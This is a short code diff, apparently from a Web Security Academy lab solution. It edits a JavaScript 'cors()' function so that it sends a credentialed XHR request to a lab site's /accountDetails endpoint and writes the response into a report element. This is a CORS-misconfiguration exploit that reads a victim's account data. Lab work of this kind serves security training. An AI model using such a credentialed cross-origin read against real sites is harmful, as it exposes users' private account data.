@@ -19,7 +19,7 @@ function cors() {
       document.getElementById("report").innerHTML = "Error";
     }
   };
-  xhr.open("GET", "https://livestream.com", true);
-  //xhr.withCredentials = true;
+  xhr.open("GET", "https://0ae900ed03354629c0fd4c1900870036.web-security-academy.net/accountDetails", true);
+  xhr.withCredentials = true;
   xhr.send();
 }
